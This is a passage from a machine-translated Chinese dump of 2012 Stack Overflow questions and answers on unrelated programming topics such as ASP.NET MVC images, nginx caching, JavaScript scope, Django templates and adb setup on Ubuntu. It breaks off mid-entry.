# asp.net-mvc-3 - 在 Asp.net-mvc3 中的数据库中显示表中的图像

> ID：11309076
> 
> 赞同：0
> 
> 时间：2012-07-03T10:33:08.740
> 
> 标签：asp.net-mvc-3, image

我有一个表，其中包含带有图像字段的用户信息，并将图像存储在二进制数据中。

我想在包含用户信息的表格中的视图页面上显示这些图像。

我的代码是..控制器

```
public ActionResult About()
        {
var data = db.dbtable.ToList();
return View(data);
} 
```

Get Image 方法 // reg 是 dbtable 的对象

```
public FileContentResult GetImage(int id)
        {            
            reg = db.dbtable.FirstOrDefault(i => i.RegNo == id);            
            if (reg != null)
            {
                return File(reg.Photo, "image/jpeg");
            }
            else
            {
                return null;
            }
        } 
```

在查看页面..

```
@model IEnumerable<MvcMySchool.dbtable>

<table width="50">
    <tr>
        <th> 
            Registration No.
        </th>
        <th>
            First Name
        </th>
        <th>
            Last Name
        </th>
        <th>
            City
        </th>
        <th>
            Photo
        </th>
    </tr>
    @foreach (var item in Model)
    {
        <tr>
            <td>
                @Html.DisplayFor(modelItem => item.RegNo)
            </td>
            <td>
                @Html.DisplayFor(modelItem => item.FirstName)
            </td>
            <td>
                @Html.DisplayFor(modelItem => item.LastName)
            </td>
            <td>
                @Html.DisplayFor(modelItem => item.City)
            </td>
            <td>
            @*HttpContext.Current.Response.Write("<img width="75" height="75" src=@(Url.Action("GetImage", "Home", new { id = item.RegNo })) />")*@
                <img width="75" height="75" src=@(Url.Action("GetImage", "Home", new { id = item.RegNo })) />
            </td>
        </tr>
    }
</table> 
```

它只显示第一行的图像，之后什么都没有。

谢谢..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:12:29.463

仅保留图像的路径可能更有意义。

如果你归档steam，

```
public FileStreamResult GetImage(int id)
{

reg = db.dbtable.FirstOrDefault(i => i.RegNo == id);            
            if (reg != null)
            {

    MemoryStream ms = new MemoryStream(reg.Photo);
    return File(ms, "image/png");

            }
            else
            {
                return null;
            }
} 
```

更合乎逻辑的保持方式

```
public FileResult GetImage(int id)
{
reg = db.dbtable.FirstOrDefault(i => i.RegNo == id);            
                if (reg != null)
                {
    FileInfo fi = new FileInfo(Server.MapPath(reg.Photo));
    return File(fi.OpenRead, "image/png");
                }
} 
```

对彼此而言

```
<tr>
    <td>
       <img src="/Home/GetImage/@item.RegNo" alt="" />
    </td>
</tr> 
```

# c# - 在 C# 中构建 NPAPI 插件

> ID：11309081
> 
> 赞同：6
> 
> 时间：2012-07-03T10:33:15.763
> 
> 标签：c#, .net, interop, npapi

尝试构建 C# NPAPI 插件我发现了一个[教程](http://colonelpanic.net/2009/03/building-a-firefox-plugin-part-one/)，它描述了您的 dll 需要实现许多方法，例如`NP_GetEntryPoints`，`NP_Initialize`以及`NPP_New`其他一些方法。

但是我想了解的是，如果我可以简单地镜像这些方法名称并按照 C# 中的文章（如 ）中的描述构造等效的数据结构，那么`_NPPluginFuncs`一切都会正常吗？

有人可以提供一些指导吗？是否可以在 C# 中构建 NPAPI 插件，如果可以，涉及的基本步骤是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-05T13:19:30.313

如文档中所述：

> NPAPI 浏览器插件的核心只是一个带有几个特定入口点的 DLL

这意味着您需要从常规 dll 中导出一些函数，这通常在 C/C++ 中完成。不幸的是，不可能从普通的 C# dll 公开任何入口点，[但看看这个答案](https://stackoverflow.com/a/4818940/566608)，通过一些努力似乎可以通过某种后期构建工具来欺骗一些导出。

无论如何不要期望从/向插件接口传递太多复杂的数据结构，这将是一件痛苦的事情。如果您有兴趣进行更多研究，则使用的关键是**“反向 P/Invoke”**，类似于从托管世界调用常规 dll 的直接 P/Invoke。

C# dll 不能直接公开“入口点”的原因是 *入口点实际上只是 dll 内的某个地址，指向一些立即可执行的汇编代码*。C# dll 是不同种类的野兽：它们只是包含“及时”编译的 IL 的文件，实际上这种编译是[通过一些操作系统技巧强制 AFAIK 进行的](http://www.brainbell.com/tutors/C_Sharp/Microsoft_Intermediate_Language_and_the_JITters.htm)。这就是反向 P/Invoke 根本不直接的原因。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-06T14:53:41.940

正如 Georg Fritzsche 在他的评论中所说：

> NPAPI 插件基本上是带有一些必需的 C 导出的 DLL

并且没有内置方法可以从用 C# 编写的程序集中导出函数（在 C 导出意义上）。

您的一些选择是：

1.  可以直接导出函数的混合模式 C++ 程序集。这可能会对在插件的宿主进程中托管 CLR 产生影响。
2.  托管导出的小型本地 DLL，然后使用 COM 互操作委托给包含插件功能的 C# 程序集。执行所谓“反向 p/invoke”的“官方”方式。
3.  一个[有趣的项目](https://sites.google.com/site/robertgiesecke/Home/uploads/unmanagedexports)，它对您的完全托管程序集进行后处理，将标记有自定义属性的静态方法转换为命名函数导出。*（我与这个项目没有任何关系；在我想知道是否有人改进了 COM 互操作的做事方式后，我偶然发现了它。）*

# binary-decision-diagram - 通过CUDD计算图像后获取BDD的所有变量（C接口）

> ID：11309083
> 
> 赞同：1
> 
> 时间：2012-07-03T10:33:17.180
> 
> 标签：binary-decision-diagram, cudd

我卡在CUDD（C接口）的BDD上的操作上，我不知道我们在计算图像时是否可以删除一些变量（从BDD的一个状态到另一个状态）以及如何传递结果BDD（最终BDD ) 要获取所有变量，有人可以告诉我我们是否可以通过 CUDD 做到这一点吗？干杯

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-04T07:54:30.553

我从未使用过 CUDD，但 BDD 中使用的变量列表通常称为它的*support*。从 BDD 中删除变量通常是通过*存在量化*来完成的。

Grepping源代码，我发现

```
/**Function********************************************************************

  Synopsis    [Finds the variables on which a DD depends.]

  Description [Finds the variables on which a DD depends.
  Returns a BDD consisting of the product of the variables if
  successful; NULL otherwise.]

  SideEffects [None]

  SeeAlso     [Cudd_VectorSupport Cudd_ClassifySupport]

  ******************************************************************************/
DdNode *
Cudd_Support(
  DdManager * dd /* manager */,
  DdNode * f /* DD whose support is sought */) 
```

和

```
/**Function********************************************************************

  Synopsis [Existentially abstracts all the variables in cube from f.]

  Description [Existentially abstracts all the variables in cube from f.
  Returns the abstracted BDD if successful; NULL otherwise.]

  SideEffects [None]

  SeeAlso     [Cudd_bddUnivAbstract Cudd_addExistAbstract]

******************************************************************************/
DdNode *
Cudd_bddExistAbstract(
  DdManager * manager,
  DdNode * f,
  DdNode * cube) 
```

# magento - 如何在主页上显示“新闻”？（马金托）

> ID：11309085
> 
> 赞同：1
> 
> 时间：2012-07-03T10:33:30.677
> 
> 标签：magento

我需要在首页上显示新闻文章，但标准方式，将此代码`{{block type="profile/profile" name="profile" template="profile/news-front.phtml"}}`放在后端的编辑器中不起作用，即使我已经`news-front.phtml`在`template/profile`. 我真的 - 真的需要帮助。中的输出`system.log`是`Not valid template file:frontend/base/default/template/profile/news-front.phtml`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T11:07:51.963

块类型真的会是配置文件/配置文件吗？如果您只是希望将文件输出为 PHP/HTML，您可能需要考虑使用 core/template 而不是 profile/profile。

# iis-6 - 在 IIS 6 中在哪里编写 URL 重写规则

> ID：11309087
> 
> 赞同：1
> 
> 时间：2012-07-03T10:33:33.140
> 
> 标签：iis-6

我有这个用于检测移动设备的代码。

```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <rewrite>
      <rules>
        <clear />
        <rule name="MobDedect" stopProcessing="true">
          <match url=".*" ignoreCase="false" />
          <conditions logicalGrouping="MatchAny">
            <add input="{HTTP_USER_AGENT}" pattern="android.+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino" />
            <add input="{HTTP_USER_AGENT}" pattern="^(1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(di|rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-)" />
          </conditions>
          <action type="Rewrite" url="http://detectmobilebrowser.com/mobile" />
        </rule>
      </rules>
    </rewrite>
  </system.webServer>
</configuration> 
```

但在 IIS 6 中，我不知道在哪里编写此规则。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T11:07:38.057

IIS 6 中没有内置的 URL 重写机制。您必须安装这样的 ISAPI 过滤器：[Ionic's Isapi Rewrite Filter](http://iirf.codeplex.com/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-06-16T14:52:01.303

您可以在 IIS 6.0 中安装 URL 重写选项。

[http://www.web-site-scripts.com/knowledge-base/article/AA-00461/0/Installation-of-URL-Rewriting-module-IIRF-for-IIS6-IIS7.html](http://www.web-site-scripts.com/knowledge-base/article/AA-00461/0/Installation-of-URL-Rewriting-module-IIRF-for-IIS6-IIS7.html)

为进程 IIS 6.0 URL 重写选项提供了所有步骤

# c - C 错误 - 数字代表什么？

> ID：11309091
> 
> 赞同：0
> 
> 时间：2012-07-03T10:33:50.987
> 
> 标签：c, compiler-errors, line-numbers

我找不到任何东西，但可能只是因为我不知道如何搜索，因为我不知道如何调用它。

我试图编译一些 C 代码并得到以下错误：

```
/path/to/file.h:55:32: error: path/to/include.h: No such file or directory 
```

我知道错误并且我知道问题出`file.h`在`line 55`- where 是一个包含，它不存在。

但是`32`代表什么？

马蒂

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-03T10:34:44.683

它是 line 中字符的编号`55`。

这也可能被称为“列号”（请参阅​​注释），但我发现这有点误导，例如制表符通常会在编辑器中占用多于一列，但对于编译器来说仍然只计为一个字符。

# android - 使用 Gmail 凭据登录 Android 应用程序

> ID：11309093
> 
> 赞同：5
> 
> 时间：2012-07-03T10:34:00.963
> 
> 标签：android, gmail, accountmanager

获取身份验证令牌后如何使用它使用谷歌凭据登录

```
 AccountManager am=AccountManager.get(this); 
 Account[] accounts= am.getAccountsByType("com.google");
 account=accounts[0];
 amf = am.getAuthToken(account,"com.google", true,  
        new AccountManagerCallback<Bundle>() {  
   public void run(AccountManagerFuture<Bundle> arg0) {  

                try {  
                    Bundle result;  
                    Intent i;  
                    String token;  

                    result = arg0.getResult();  
        if (result.containsKey(AccountManager.KEY_INTENT)) {  
                        i = (Intent)result.get(AccountManager.KEY_INTENT);  
                        System.out.println("INtect=="+i.toString());
                        if (i.toString().contains("GrantCredentialsPermissionActivity")) {  

                            cbt.startActivity(i);  
                            System.out.println("ssstttt");
                        } else {  
                            cbt.startActivity(i);
                            System.out.println("endddddd");
                        }  

                    } else {       
 token = (String)result.get(AccountManager.KEY_AUTHTOKEN); 
```

我已经从谷歌帐户获得了生成的 API 密钥，但是将 authToken 和 API 密钥发送到哪里，以便用户可以使用他的 gmail 凭据登录

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T10:34:38.393

不建议使用 Gmail 凭据，因为 Google+ 和 Gmail 已合并，您真正想要的是能够使用 Google+ 登录。这也将使您能够进行 API 调用。

[在此处](https://developers.google.com/+/mobile/android/sign-in)阅读在您的应用中实施 Google+ 登录的更多信息

# ruby-on-rails-3 - nginx 中的什么决定了什么进入 rails 以及直接提供什么？

> ID：11309099
> 
> 赞同：1
> 
> 时间：2012-07-03T10:34:22.497
> 
> 标签：ruby-on-rails-3, nginx

我有一个 nginx + Thin + Rails 3.2 设置。目前我正在尝试设置 nginx，以便它可以直接提供缓存页面。

但是 nginx 仍然在以下 nginx 配置文件中将 *.html 请求传递给 Rails。html 文件存在于 public 文件夹中，nginx 确实找到了它们，只是它们仍然传递给 Rails。

```
upstream site {
  server unix:/home/site/deploy/site/shared/pids/thin.0.sock;
}

server {
  listen 80;
  server_name www.example.com;
  rewrite ^(/.*) http://example.com$1 permanent;
}

# asset server
server {
  listen 80;
  server_name assets.example.com;
  expires max;
  add_header Cache-Control public;
  charset utf-8;
  root   /home/site/deploy/site/current/public/;
}

# frontend
server {
  listen 80;
  server_name .example.com;
  charset utf-8;

  root   /home/site/deploy/site/current/public/;
  index  index.html;

  location ~* ^.+.(jpg|jpeg|gif|png|swf|zip|rar|doc|xls|exe|pdf|ppt|txt|tar)$ {
    root /home/site/deploy/site/current/public/;
    expires max;
    break;
  }

  # serve static files
  if (-f $request_filename) {
    break;
  }

  gzip on;

  location / {
    proxy_set_header  X-Real-IP  $remote_addr;
    proxy_set_header  X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header Host $http_host;
    proxy_redirect off;

    if (-f $request_filename) {
      break;
    }

    if (-f $document_root/cache/$host/$uri/index.html) {
      rewrite (.*) /cache/$host/$1/index.html break;
    }

    if (-f $document_root/cache/$host/$uri.html) {
      rewrite (.*) /cache/$host/$1.html break;
    }

    if (-f $document_root/cache/$host/$uri) {
      rewrite (.*) /cache/$host/$1 break;
    }

    proxy_pass http://site;
    break;
  }
} 
```

我是 nginx 新手，这个配置文件是从我之前没有做过的项目中复制过来的，所以这可能是一个非常新手的问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T14:35:23.453

要允许 nginx 提供静态缓存页面，您需要使用**try_files**，让我分享一下配置：

```
upstream site {
  server          unix:/home/site/deploy/site/shared/pids/thin.0.sock fail_timeout=0;
}

server {
  listen          80;
  server_name     www.example.com;
  rewrite ^(/.*)  http://example.com$1 permanent;
}

server {
  listen          80;
  server_name     example.com;
  charset         utf-8;

  root            /home/site/deploy/site/current;
  try_files       $uri/index.html $uri @thin;

  gzip on;

  location @thin {
    proxy_set_header  X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header  Host $http_host;
    proxy_redirect    off;
    proxy_pass        http://site;
  }

  location ~* ^.+.(jpg|jpeg|gif|png|swf|zip|rar|doc|xls|exe|pdf|ppt|txt|tar)$ {
    root             /home/site/deploy/site/current/public/;
    expires          max;
    break;
  }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T03:41:21.957

这是一个更一般的理论答案（SO编辑拒绝了我在上面的答案中解释的编辑。）：

Nginx 有一个`ngx_static`默认开启的模块。*该模块在内容阶段*结束时运行。如果该位置块中没有其他内容命令可以在请求中工作，它将提供静态文件。它也仅在 uri 不以斜杠结尾时才有效。

*因此，要提供静态文件，需要在content phase*结束时确保 uri 是一个有效的路径名，并且**没有其他 content phase 命令**可以在同一位置块中提供内容。

就我而言，我想访问缓存页面，我可以用它`try_files`来重写 uri。*在内容阶段*`try_files`之前的一个阶段工作，它将检查文件是否存在。如果其中之一存在，则 uri 将更改为该文件。然后在内容阶段，它将被提供。

 *如果我想提供静态文件（如果存在）或提供动态内容（如果不存在）怎么办？通常提供动态内容会阻止提供静态文件。在这种情况下，可以使用不同的位置块。如果在 过程中没有找到静态文件`try_files`，我们跳转到另一个位置块（在示例`@thin`中，所有动态内容都在其中提供。但如果静态文件存在，我们将停留在原始位置块中，并且当我们进入内容阶段时，因为有没有其他内容服务命令，则提供静态文件。*

# javascript - socket.io + sencha 中的 javascript 命名空间问题

> ID：11309101
> 
> 赞同：1
> 
> 时间：2012-07-03T10:34:43.777
> 
> 标签：javascript, sencha-touch, socket.io

这可能是我知道的一个非常基本的 Javascript，但我就是不明白..

```
Ext.regController('Chat', {
    initSocketConnection: function() {
    this.chatStore = new App.Store.Chat();
            ...
    this.socket = io.connect(settings.get('server'), {port: 8080});

    this.socket.on(
        'message',
        this.addMessageToChatStore
    );

},

addMessageToChatStore: function(message) {
    console.log(message);
        console.log(this);     << console shows the 'this' has become SocketNameSpace
    this.chatStore.add(message);   << this line error with "Undefined" chatStore

    this.send(message);
}, 
```

控制台打印输出显示函数中`"this"`的`addMessageToChatStore``"SocketNamespace"`

如何摆脱错误？

概括问题。我认为最好将其描述为函数链调用困境。

一个类有一些本地变量，它是另一个类的实例。当这个 var 监听某些事件时，它会调用父类的方法。问题是当这个方法被调用时，它在另一个类的上下文中，因此范围已经改变并且对原始父类方法的访问被拒绝。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T10:38:45.160

在 javascript 中，`this`变量由调用者决定。您可以使用自执行功能来确保您引用正确的实体，而不是使用`this`：

```
Ext.regController('Chat', (function() {
  var self = {
    initSocketConnection: function() {
      self.chatStore = new App.Store.Chat();
      ...
      self.socket = io.connect(settings.get('server'), {port: 8080});

      self.socket.on(
        'message',
        this.addMessageToChatStore
      );
    },
    addMessageToChatStore: function(message) {
      console.log(message);
      self.chatStore.add(message);
      self.send(message);
    }
  };
  return self;
}())); 
```

**更新**

基于完整的代码片段，我不确定`render`函数在哪里定义，如果`render`是全局函数`self.viewChat = render({xtype : 'App.View.Chat'});`就足够了，否则它可能被定义在`this`（`this`为调用定义的`index`）上，所以以下可能就足够了`self.viewChat = this.render({xtype : 'App.View.Chat'});`。

如果我是一个赌徒，我会选择后者，所以代码将是（删除了注释掉的代码）：

```
Ext.regController('Chat', (function() {
    var self = {
        index: function() {
            if (!self.socket) {
                self.initSocketConnection();
            }

            self.showChat();
        },
        /**
         * init the socket connection to the node.js server
         * using user settings
         *
         */
        initSocketConnection: function() {
            self.chatStore = new App.Store.Chat();
            self.chatStore.add({
                user: "Figo",
                message: "Welcome!"
            });
            self.configStore = Ext.StoreMgr.get('ConfigStore');
            var settings = self.configStore.getAt(0);

            self.socket = io.connect(settings.get('server'), {
                port: 8080
            });

            // Event Listener
            self.socket.on('connect', self.registerUser);
            self.socket.on('message', self.addMessageToChatStore);
            App.on('newMsg', self.sendMessageToServer);
        },
        sendMessageToServer: function(msg) {
            self.socket.send(msg);
        },
        addMessageToChatStore: function(message) {
            console.log(message);
            console.log(this);
            console.log(this.parent);

            self.chatStore.add(message);
            self.socket.send(message);
        },
        registerUser: function() {
            self.configStore = Ext.StoreMgr.get('ConfigStore');
            var settings = self.configStore.getAt(0);

            var user = {
                nickname: settings.get('nickname'),
                gravatar: settings.get('gravatar')
            };
            console.log(user);
            self.socket.send(user);
        },
        /**
         * Show chat view
         */
        showChat: function() {
            if (!self.viewChat) {

                self.viewChat = this.render({
                    xtype: 'App.View.Chat'
                });

                self.viewChat.query('#settingsButton')[0].on('tap', self.showConfig, self);
            }
            self.application.viewport.setActiveItem(
            self.viewChat, {
                type: 'slide',
                direction: 'left'
            });
        },
        /**
         * Show config View
         */
        showConfig: function() {
            Ext.dispatch({
                controller: 'Viewport',
                action: 'showConfig'
            });
        }
    };
    return self;
}())); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T12:39:22.047

对于@Rich.okelly

这是错误（在代码中突出显示）

```
Uncaught TypeError: Object #<Object> has no method 'render' app.all.js:438
self.showChat app.all.js:438
self.index app.all.js:351
Ext.util.Dispatcher.Ext.extend.dispatch sencha-touch-debug.js:10630
Ext.dispatch sencha-touch-debug.js:10667
Ext.regController.showChat app.all.js:293
fire sencha-touch-debug.js:979
Ext.util.Observable.Ext.extend.fireEvent sencha-touch-debug.js:595 
```

这是完整的代码（同一项目中的其他代码未显示）：

```
Ext.regController('Chat',(function() {
    var self = {
    /**
     * Index action
     *
     * @return {void}
     */
    index: function() {

        if (!self.socket) {
            self.initSocketConnection();
        }

        self.showChat();
    },

    /**
     * init the socket connection to the node.js server
     * using user settings
     *
     */
    initSocketConnection: function() {
        self.chatStore = new App.Store.Chat();
        self.chatStore.add({user: "Figo", message: "Welcome!"});
        self.configStore = Ext.StoreMgr.get('ConfigStore');
        //this.configStore = new App.Store.Config()
        var settings = self.configStore.getAt(0);

        //this.socket = new App.util.Socketio(settings.get('server'), {port: 4000});
        //this.socket.connect();
        self.socket = io.connect(settings.get('server'), {port: 8080});

        /*
        this.socket.on('message', function (data) {
                console.log(data);
                this.parent.addMessageToChatStore(data);
                this.emit('message', data);
        });

        this.socket.on('message', 
                this.addMessageToChatStore
        );
         */     

        // Event Listener

        self.socket.on(
            'connect',
            self.registerUser
        );

        self.socket.on(
            'message',
            self.addMessageToChatStore
        );

        App.on(
            'newMsg',
            self.sendMessageToServer
        ); 
    },

    sendMessageToServer: function(msg){
        self.socket.send(msg);
    },

    addMessageToChatStore: function(message) {
        console.log(message);
                  console.log(this);
                  console.log(this.parent);
        //if (!this.chatStore)
        //this.chatStore = new App.Store.Chat();
        self.chatStore.add(message);
        //App.Controller.Chat.chatStore.add(message);

        self.socket.send(message);
    },

    registerUser: function() {
        self.configStore = Ext.StoreMgr.get('ConfigStore');
        var settings = self.configStore.getAt(0);

        var user = {
            nickname: settings.get('nickname'),
            gravatar: settings.get('gravatar')
        };
        console.log(user);
        self.socket.send(user);
    },

    /**
     * Show chat view
     */
    showChat: function() {
        if (!self.viewChat) {

            self.viewChat = self.render({    << fails over here
                xtype: 'App.View.Chat'
            });

            self.viewChat.query('#settingsButton')[0].on(
                'tap',
                self.showConfig,
                self
            );
        }
        self.application.viewport.setActiveItem(
            self.viewChat,
            {
                type: 'slide',
                direction: 'left'
            }
        );
    },

    /**
     * Show config View
     */
    showConfig: function() {
        Ext.dispatch({
            controller: 'Viewport',
            action    : 'showConfig'
        });
    }

    };
    return self;
}())); 
```

# django - 在 django 模板中获取变量

> ID：11309107
> 
> 赞同：0
> 
> 时间：2012-07-03T10:35:00.360
> 
> 标签：django, django-templates, django-views

我是 django 的新手。我面临一个小问题，但无法解决。在我的模板中，当我尝试使用 {{ }} 访问任何变量时，它返回空白，同时将某些内容显示为 detailview。而它在列表视图中工作正常。

代码：urls.py

```
urlpatterns = patterns('',

                           url(r'^$', ListView.as_view(
                                  queryset=Profile.objects.all().order_by("First_Name"),
                                  template_name="STUDENT_REGISTRATION.html")),
                           url(r'^(?P<pk>\d+)/$',DetailView.as_view(
                                  model=Profile,
                                  template_name="Profile.html")), 
```

模板：

```
{%extends "base.html" %}
{% block content %}

<h2>Registration No. :- {{ Profile.Registration_No }} <br>
    Full Name : {{ Profile.First_Name }} {{ Profile.Last_Name }} </h2>

<div class="Profile_meta">
{{ Profile.Date_of_Birth}}
</div>

<div class="Profile_body">
{{ Profile.Permanent_Address|safe|linebreaks }}
</div>

{%endblock%} 
```

请帮忙..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T10:49:27.250

您应该将您的 Profile 实例称为：

```
 {{ object.First_Name }} {{ object.Last_Name }} 
```

顺便说一下，看看 PEP8，尝试为类名保留 CamelCaseNames，为实例保留下划线名称。这将使您的代码更易于阅读。

# android - 安卓设备USB调试

> ID：11309110
> 
> 赞同：2
> 
> 时间：2012-07-03T10:35:17.577
> 
> 标签：android, debugging, usb, adb

我今天将我的手机（三星 Galaxy S I9000）插入我的 Ubuntu 计算机，并注意到我的手机上没有出现我的 USB 调试（我检查了设备设置是否正确）。我不确定发生了什么，我无法弄清楚。我的电脑无法识别我的手机，我的手机也无法开始运行 USB 调试。它在我的手机上检查过，但也许我的司机不知何故搞砸了。我也重新启动了它，发出 adb 命令但没有帮助。我的 HTC 设备也出现了同样的问题，但不知道如何解决。

有人有任何提示吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-04T11:52:51.153

在 ubuntu 中按照这个步骤可以配置 adb

[http://esausilva.com/2010/05/13/setting-up-adbusb-drivers-for-android-devices-in-linux-ubuntu/](http://esausilva.com/2010/05/13/setting-up-adbusb-drivers-for-android-devices-in-linux-ubuntu/)

您可能没有添加 /etc/udev/rules.d/51-android.rules。我遇到了同样的问题，它有效

为您的三星设备添加

```
#Samsung
SUBSYSTEM=="usb", SYSFS{idVendor}=="04e8", MODE="0666" 
```

在上面的文件中。更多详细信息检查该 URL

# ruby-on-rails - Rails 日期选择参数

> ID：11309113
> 
> 赞同：0
> 
> 时间：2012-07-03T10:35:33.293
> 
> 标签：ruby-on-rails, ruby-on-rails-3, forms, date

我正在使用 rails 3 表单中的日期选择。

```
<%=f.date_select :date %> 
```

我想限制日期，以便您只能选择星期天的日期。有什么办法可以做到这一点吗？

我也试图阻止已经过去的日期出现。

提前感谢您的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:01:39.500

Rails 的 date_select 字段生成三个下拉列表来选择日期的部分。没有 chanche，您可以修改例如月份，这一天仍然是星期天。

您必须编写一些 js 魔术来强制执行这样的角色，或者找到一个已经存在的日期选择器并对其进行限制。或者，您让用户选择一个星期，并从中计算出星期天的确切日期。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T11:01:37.163

好的，进一步研究了这一点，由于 date_select 字段的格式，我认为这是不可能的。我能得到的最接近的是

```
<%=f.date_select :date, start_year: Time.now.year %> 
```

这样至少你不能选择前几年的日期。我通过将视图设置为自动删除不相关的记录来实现对过去几天和几个月的限制：

```
<% if(service.date < Date.today) %>
  <% service.destroy %>
<% end %> 
```

不完美，但在我的情况下可以完成这项工作。

# unix - Windows 7 企业版和终极版：Unix 支持

> ID：11309118
> 
> 赞同：0
> 
> 时间：2012-07-03T10:35:58.833
> 
> 标签：unix, windows-7

我读过 Windows 7 Enterprise 和 Ultimate 支持运行 Unix 命令。系统如何满足此功能？它有壳吗？它可以识别哪些文件格式？ELF、a.out 等？它是否安装了任何 Unix 库？任何 BSD（或 GPL？）代码？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T10:42:13.307

这是：[http ://www.cygwin.com/](http://www.cygwin.com/)

“Cygwin 是一组工具，可为 Windows 提供 Linux 外观和感觉环境。” “它是一个 DLL (cygwin1.dll)，它充当提供大量 Linux API 功能的 Linux API 层。”

已经有几种工具，如果缺少，您可以尝试编译您需要的东西。阅读常见问题解答：[http ://cygwin.com/faq-nochunks.html#faq.what](http://cygwin.com/faq-nochunks.html#faq.what)

# java - 使 JLabel 文本正确增长

> ID：11309124
> 
> 赞同：1
> 
> 时间：2012-07-03T10:36:17.297
> 
> 标签：java, swing, alignment, jlabel

嗨，是否可以让 JLabel 文本向右而不是向左增长？我认为在我的程序中强制它的唯一方法是使用 setMinimumSize （由于某种原因，它设置了最大尺寸，当我放置太多文本时，它会在最后添加三个点）有什么想法吗？

```
min = new Dimension(100, 10);
mylabel.setHorizontalAlignment(JLabel.RIGHT); //does not do anything
mylabel.setPreferredSize(pref); //does not do anything
mylabel.setMaximumSize(max); //does not change anything
mylabel.setMinimumSize(min); //constrains max size instead of min
mylabel.setBorder(border);

gbc.gridx = 2;
labels.add(mylabel, gbc); //labels is a JPanel 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:12:10.133

好吧，我找到了解决方案！

在 gridx 更改后添加这一行就足够了：

```
 gbc.anchor = GridBagConstraints.EAST; 
```

# c++ - 快速构建STL图

> ID：11309125
> 
> 赞同：1
> 
> 时间：2012-07-03T10:36:17.367
> 
> 标签：c++, stl, map

> **可能重复：**
> [如何将排序的 std::list 的 std::pair 转换为 std::map](https://stackoverflow.com/questions/3412623/how-to-convert-a-sorted-stdlist-of-stdpair-to-a-stdmap)
> [STL 映射容器在构造时是否优化（平衡树）？](https://stackoverflow.com/questions/10428342/is-the-stl-map-container-optimized-balanced-tree-while-constructed)

由于平衡的二叉搜索树可以从元素的`O(n)`排序列表快速（`map`一张地图，`O(n)`而不是`O(nLogn)`由`map::insert`?

# php - Yii 中的 onMissingTranslation 事件无法正常工作

> ID：11309127
> 
